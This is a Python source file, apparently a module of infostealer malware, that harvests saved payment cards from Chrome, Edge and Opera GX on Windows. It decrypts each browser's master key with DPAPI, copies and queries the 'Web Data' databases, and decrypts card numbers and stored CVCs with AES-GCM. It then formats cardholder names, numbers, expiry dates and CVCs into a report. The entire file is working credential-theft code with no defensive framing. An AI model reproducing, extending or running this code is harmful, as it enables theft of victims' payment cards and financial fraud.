import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
import time
import tempfile
import datetime

def sec_to_DDMMYYHHMMSS(seconds):
    return (datetime.datetime(1970, 1, 1) + datetime.timedelta(seconds=seconds)).strftime('%d/%m/20%y %H:%M:%S')

temp_dir = tempfile.gettempdir()

# ----------------------------------------------------- EDGE ------------------------------------------------------------------------

def get_edge_key():
    try:
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State', "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
    except: exit()
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password_edge(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception as e: return "Chrome < 80"



def get_passwords_edge():
    master_key = get_edge_key()
    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Default\Web Data'
    try: shutil.copy2(login_db, f"{temp_dir}\Loginvault.db")
    except: pass
    conn = sqlite3.connect(f"{temp_dir}\Loginvault.db")
    cursor = conn.cursor()

    cursor2 = None
    cursor3 = None

    try:
        result = {}
        # cursor.execute("SELECT value_encrypted FROM local_stored_cvc")
        cursor.execute("SELECT id, card_number_encrypted FROM unmasked_credit_cards")

        exposed_ids = []

        for index, row in enumerate(cursor.fetchall()):
            id = row[0]
            exposed_ids.append(id)

            cc = decrypt_password_chrome(row[1], master_key)

            conn2 = sqlite3.connect(f"{temp_dir}\Loginvault.db")
            cursor2 = conn2.cursor()

            cursor2.execute("SELECT value_encrypted FROM local_stored_cvc WHERE guid = ?", (id,))
            for index2, row2 in enumerate(cursor2.fetchall()):
                cvc = decrypt_password_chrome(row2[0], master_key)


            conn3 = sqlite3.connect(f"{temp_dir}\Loginvault.db")
            cursor3 = conn3.cursor()

            cursor3.execute("SELECT * FROM masked_credit_cards WHERE id = ?", (id,))
            for index3, row3 in enumerate(cursor3.fetchall()):
                name_on_card = row3[1]
                nickname = row3[7]
                exp_year = row3[5]
                exp_month = row3[4]


            result[index] = [name_on_card, cc, cvc, exp_year, exp_month, nickname]

    except Exception as e: print(e)
    try:
        cursor.close(); conn.close()
        cursor2.close(); conn2.close()
    except: ...
    try: os.remove(f"{temp_dir}\Loginvault.db")
    except Exception as e: pass; pass

    return result


# ----------------------------------------------------------------- CHROME ------------------------------------------------------------------

def get_chrome_encryption_key():
    try:
        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except: time.sleep(1)

def decrypt_password_chrome(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try: return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except: return ""

def get_passwords_chrome():
    key = get_chrome_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Web Data")
    file_name = "ChromeData.db"
    shutil.copyfile(db_path, f"{temp_dir}\{file_name}")
    db = sqlite3.connect(f"{temp_dir}\{file_name}")
    cursor = db.cursor()
    cursor.execute("SELECT name_on_card, card_number_encrypted, expiration_year, expiration_month, billing_address_id, origin, use_date, date_modified, use_count, nickname FROM credit_cards")
    result = {}
    for index, row in enumerate(cursor.fetchall()):
        name_on_card = row[0]
        credit_card = decrypt_password_chrome(row[1], key)
        expiration_year = row[2]
        expiration_month = row[3]
        billing_address_id = row[4]
        origin = row[5]
        use_date = row[6]
        date_modified = row[7]
        use_count = row[8]
        nickname = row[9]
        result[index] = [name_on_card, credit_card, expiration_year, expiration_month, billing_address_id, origin, use_date, date_modified, use_count, nickname]

    cursor.close(); db.close()
    try: os.remove(f"{temp_dir}\{file_name}")
    except: pass
    return result

# --------------------------------------------------------------------------- OPERA GX -----------------------------------------------------------------

def get_operagx_encryption_key():
    try:
        #os.path.join(roaming, "Opera Software", "Opera GX Stable")
        local_state_path = os.path.join(os.environ["APPDATA"], "Opera Software", "Opera GX Stable", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except: time.sleep(1)

def decrypt_password_operagx(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try: return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except: return ""

def get_passwords_operagx():
    key = get_operagx_encryption_key()
    db_path = os.path.join(os.environ["APPDATA"], "Opera Software", "Opera GX Stable", "Web Data")
    file_name = "OperaGXdata.db"
    shutil.copyfile(db_path, f"{temp_dir}\{file_name}")
    db = sqlite3.connect(f"{temp_dir}\{file_name}")
    cursor = db.cursor()
    cursor.execute("SELECT name_on_card, card_number_encrypted, expiration_year, expiration_month, billing_address_id, origin, use_date, date_modified, use_count, nickname FROM credit_cards")
    result = {}
    for index, row in enumerate(cursor.fetchall()):
        name_on_card = row[0]
        credit_card = decrypt_password_chrome(row[1], key)
        expiration_year = row[2]
        expiration_month = row[3]
        billing_address_id = row[4]
        origin = row[5]
        use_date = row[6]
        date_modified = row[7]
        use_count = row[8]
        nickname = row[9]
        result[index] = [name_on_card, credit_card, expiration_year, expiration_month, billing_address_id, origin, use_date, date_modified, use_count, nickname]

    cursor.close(); db.close()
    try: os.remove(f"{temp_dir}\{file_name}")
    except: pass
    return result

# ------------------------------------------------------------------------------------------------------------------------------------------------------

def grab_passwords():
    try: chrome = get_passwords_chrome()
    except Exception as e: print(f"chrome failed\n{e}")

    try: edge = get_passwords_edge()
    except Exception as e: print(f"edge failed\n{e}")

    try: operagx = get_passwords_operagx()
    except Exception as e: print(f"operagx failed\n{e}")

    return chrome, edge, operagx

order = ["Chrome", "Edge", "Opera GX"]

def get_cc_formatted():
    res = ""
    for browser_index, browser in enumerate(order):
        try:
            res += f"{browser}:\n"
            passes = grab_passwords()[browser_index]
            for index, site in enumerate(passes):
                if browser == "Chrome":
                    ...
                if browser == "Edge":
                    res += f"name_on_card: {passes[site][0]}\n"
                    res += f"cc: {passes[site][1]}\n"
                    res += f"exp_date: {passes[site][3]}/{passes[site][4]}\n"
                    res += f"cvc: {passes[site][2]}\n"
                    res += f"nickname: {passes[site][5]}\n\n"

                if browser == "Opera GX":
                    res += f"name_on_card: {passes[site][0]}\n"
                    res += f"cc: {passes[site][1]}\n"
                    res += f"exp_date: {passes[site][2]}/{passes[site][3]}\n"
                    res += f"billing_address_id: {passes[site][4]}\n"
                    res += f"origin: {passes[site][5]}\n"
                    res += f"use_date: {sec_to_DDMMYYHHMMSS(passes[site][6])}\n"
                    res += f"date_modified: {sec_to_DDMMYYHHMMSS(passes[site][7])}\n"
                    res += f"use_count: {passes[site][8]}\n"
                    res += f"nickname: {passes[site][9]}\n\n"

        except Exception as e:
            print(e)

    return res